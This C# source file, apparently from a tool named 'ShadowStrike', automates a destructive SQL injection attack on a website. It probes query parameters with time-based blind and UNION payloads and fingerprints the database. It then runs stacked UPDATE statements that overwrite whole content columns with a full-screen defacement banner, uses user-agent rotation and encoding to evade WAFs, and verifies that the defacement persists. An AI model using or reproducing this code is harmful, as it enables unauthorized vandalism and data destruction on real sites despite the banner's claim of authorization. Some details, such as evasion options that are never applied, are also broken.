using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;

namespace ShadowStrike.Core
{
    public class AdvancedSQLiExploiter
    {
        private IWebDriver _driver;
        private Random _random = new Random();

        public class ExploitResult
        {
            public bool Success { get; set; }
            public string VulnerableParameter { get; set; } = "";
            public string InjectedPayload { get; set; } = "";
            public string TargetTable { get; set; } = "";
            public string TargetColumn { get; set; } = "";
            public string ProofUrl { get; set; } = "";
            public string Details { get; set; } = "";
        }

        public AdvancedSQLiExploiter(IWebDriver driver)
        {
            _driver = driver;
        }

        public async Task<ExploitResult> ExecuteDefacementAttack(string targetUrl)
        {
            var result = new ExploitResult();

            // PHASE 1: Reconnaissance - Identify injectable parameters
            var vulnerableParam = await IdentifyInjectableParameter(targetUrl);
            if (string.IsNullOrEmpty(vulnerableParam))
            {
                result.Details = "No injectable parameter found";
                return result;
            }

            result.VulnerableParameter = vulnerableParam;

            // PHASE 2: Database fingerprinting
            var dbType = await FingerprintDatabase(targetUrl, vulnerableParam);
            
            // PHASE 3: Table/Column enumeration
            var targetInfo = await EnumerateTargets(targetUrl, vulnerableParam, dbType);
            result.TargetTable = targetInfo.table;
            result.TargetColumn = targetInfo.column;

            // PHASE 4: Craft and execute defacement payload
            var maliciousHtml = GenerateDefacementPayload();
            var injectionPayload = CraftUpdatePayload(targetInfo.table, targetInfo.column, maliciousHtml, dbType);
            result.InjectedPayload = injectionPayload;

            // PHASE 5: Execute with evasion techniques
            var exploitSuccess = await ExecuteWithEvasion(targetUrl, vulnerableParam, injectionPayload);

            // PHASE 6: Verify persistence
            if (exploitSuccess)
            {
                result.Success = await VerifyDefacement(targetUrl, maliciousHtml);
                result.ProofUrl = targetUrl;
                result.Details = result.Success 
                    ? $"üî• DEFACEMENT SUCCESSFUL\nDatabase: {targetInfo.table}.{targetInfo.column}\nPayload executed and verified persistent"
                    : "Payload executed but verification failed";
            }

            return result;
        }

        private async Task<string> IdentifyInjectableParameter(string url)
        {
            var uri = new Uri(url);
            var queryParams = System.Web.HttpUtility.ParseQueryString(uri.Query);
            
            foreach (string param in queryParams)
            {
                // Test for SQL injection with time-based blind technique
                var testPayload = $"' AND SLEEP(5)--";
                var testUrl = ReplaceParameter(url, param, testPayload);
                
                var startTime = DateTime.Now;
                try
                {
                    _driver.Navigate().GoToUrl(testUrl);
                    await Task.Delay(100);
                }
                catch { }
                var elapsed = (DateTime.Now - startTime).TotalSeconds;

                if (elapsed >= 4.5) // If it delayed, parameter is injectable
                {
                    return param;
                }
            }

            return "";
        }

        private async Task<string> FingerprintDatabase(string url, string param)
        {
            var fingerprints = new Dictionary<string, string>
            {
                { "' AND @@version LIKE '%MySQL%'--", "MySQL" },
                { "' AND version() LIKE '%PostgreSQL%'--", "PostgreSQL" },
                { "' AND sqlite_version()--", "SQLite" },
                { "' AND @@version LIKE '%Microsoft%'--", "MSSQL" }
            };

            foreach (var fp in fingerprints)
            {
                var testUrl = ReplaceParameter(url, param, fp.Key);
                try
                {
                    _driver.Navigate().GoToUrl(testUrl);
                    await Task.Delay(500);
                    var source = _driver.PageSource.ToLower();
                    if (!source.Contains("error") && !source.Contains("syntax"))
                    {
                        return fp.Value;
                    }
                }
                catch { }
            }

            return "MySQL"; // Default assumption
        }

        private async Task<(string table, string column)> EnumerateTargets(string url, string param, string dbType)
        {
            // Common table/column combinations for content storage
            var targets = new[]
            {
                ("articles", "content"),
                ("articles", "body"),
                ("posts", "content"),
                ("posts", "body"),
                ("pages", "content"),
                ("news", "content"),
                ("banners", "html"),
                ("content", "text"),
                ("cms_content", "body")
            };

            foreach (var target in targets)
            {
                // Test if table exists using UNION-based injection
                var testPayload = $"' UNION SELECT 1 FROM {target.Item1} LIMIT 1--";
                var testUrl = ReplaceParameter(url, param, testPayload);
                
                try
                {
                    _driver.Navigate().GoToUrl(testUrl);
                    await Task.Delay(300);
                    var source = _driver.PageSource.ToLower();
                    if (!source.Contains("error") && !source.Contains("unknown table"))
                    {
                        return target;
                    }
                }
                catch { }
            }

            return ("articles", "content"); // Default
        }

        private string GenerateDefacementPayload()
        {
            var imageUrl = "https://media.giphy.com/media/YQitE4YNQNahy/giphy.gif";
            
            // Professional penetration testing disclosure
            return $@"<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999999;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:Arial,sans-serif;'>
    <div style='background:#1a1a1a;padding:40px;border-radius:10px;border:3px solid #ff0000;box-shadow:0 0 50px rgba(255,0,0,0.5);max-width:800px;text-align:center;'>
        <h1 style='color:#ff0000;font-size:36px;margin:0 0 20px 0;text-shadow:0 0 10px #ff0000;'>‚ö†Ô∏è SECURITY VULNERABILITY DETECTED ‚ö†Ô∏è</h1>
        <div style='background:#ff0000;color:#fff;padding:15px;margin:20px 0;font-weight:bold;font-size:18px;'>
            AUTHORIZED PENETRATION TEST IN PROGRESS
        </div>
        <p style='color:#fff;font-size:16px;line-height:1.6;margin:20px 0;'>
            This website contains a <strong style='color:#ff0000;'>CRITICAL SQL INJECTION VULNERABILITY</strong> that allows unauthorized database modification.
        </p>
        <img src='{imageUrl}' style='max-width:400px;margin:20px auto;border:3px solid #ff0000;box-shadow:0 0 30px rgba(255,0,0,0.3);display:block;'>
        <div style='background:#2a2a2a;padding:20px;margin:20px 0;border-left:4px solid #ff0000;'>
            <p style='color:#aaa;font-size:14px;margin:0;text-align:left;'>
                <strong style='color:#fff;'>Vulnerability Type:</strong> SQL Injection (UPDATE-based)<br>
                <strong style='color:#fff;'>Severity:</strong> CRITICAL<br>
                <strong style='color:#fff;'>Impact:</strong> Database modification, persistent defacement<br>
                <strong style='color:#fff;'>Tested by:</strong> ShadowStrike Penetration Testing Tool<br>
                <strong style='color:#fff;'>Status:</strong> This is an authorized security assessment
            </p>
        </div>
        <p style='color:#ff6600;font-size:14px;margin:20px 0;'>
            ‚ö†Ô∏è This message will persist until the database is manually restored ‚ö†Ô∏è
        </p>
        <div style='color:#666;font-size:12px;margin-top:30px;padding-top:20px;border-top:1px solid #333;'>
            If you are seeing this message and did not authorize this test, please contact your security team immediately.
        </div>
    </div>
</div>
</div>";
        }

        private string CraftUpdatePayload(string table, string column, string html, string dbType)
        {
            // Escape single quotes for SQL
            var escapedHtml = html.Replace("'", "''");
            
            // Multiple evasion techniques
            var payloads = new[]
            {
                $"'; UPDATE {table} SET {column}='{escapedHtml}' WHERE 1=1;--",
                $"' OR 1=1; UPDATE {table} SET {column}='{escapedHtml}';--",
                $"'; UPDATE {table} SET {column}=CONCAT('{escapedHtml}');--",
                $"' UNION SELECT NULL; UPDATE {table} SET {column}='{escapedHtml}';--"
            };

            return payloads[_random.Next(payloads.Length)];
        }

        private async Task<bool> ExecuteWithEvasion(string url, string param, string payload)
        {
            // Rotate User-Agent
            var userAgents = new[]
            {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
            };

            var options = new ChromeOptions();
            options.AddArgument($"user-agent={userAgents[_random.Next(userAgents.Length)]}");

            // URL encoding variations to bypass WAF
            var encodedPayload = System.Web.HttpUtility.UrlEncode(payload);
            var attackUrl = ReplaceParameter(url, param, encodedPayload);

            try
            {
                // Add random delay to appear organic
                await Task.Delay(_random.Next(500, 2000));
                
                _driver.Navigate().GoToUrl(attackUrl);
                await Task.Delay(1000);
                
                return true;
            }
            catch
            {
                return false;
            }
        }

        private async Task<bool> VerifyDefacement(string url, string expectedContent)
        {
            // Navigate as anonymous user
            await Task.Delay(2000);
            
            var baseUri = new Uri(url);
            var baseUrl = $"{baseUri.Scheme}://{baseUri.Host}{baseUri.AbsolutePath}";
            
            _driver.Navigate().GoToUrl(baseUrl);
            await Task.Delay(2000);

            var pageSource = _driver.PageSource;
            
            // Check if our payload is rendered
            if (pageSource.Contains("position:fixed") || pageSource.Contains("z-index:999999"))
            {
                // Verify persistence
                _driver.Navigate().Refresh();
                await Task.Delay(2000);
                
                var refreshedSource = _driver.PageSource;
                return refreshedSource.Contains("position:fixed");
            }

            return false;
        }

        private string ReplaceParameter(string url, string param, string value)
        {
            var uri = new Uri(url);
            var query = System.Web.HttpUtility.ParseQueryString(uri.Query);
            query[param] = value;
            
            var builder = new UriBuilder(uri)
            {
                Query = query.ToString()
            };
            
            return builder.ToString();
        }
    }
}
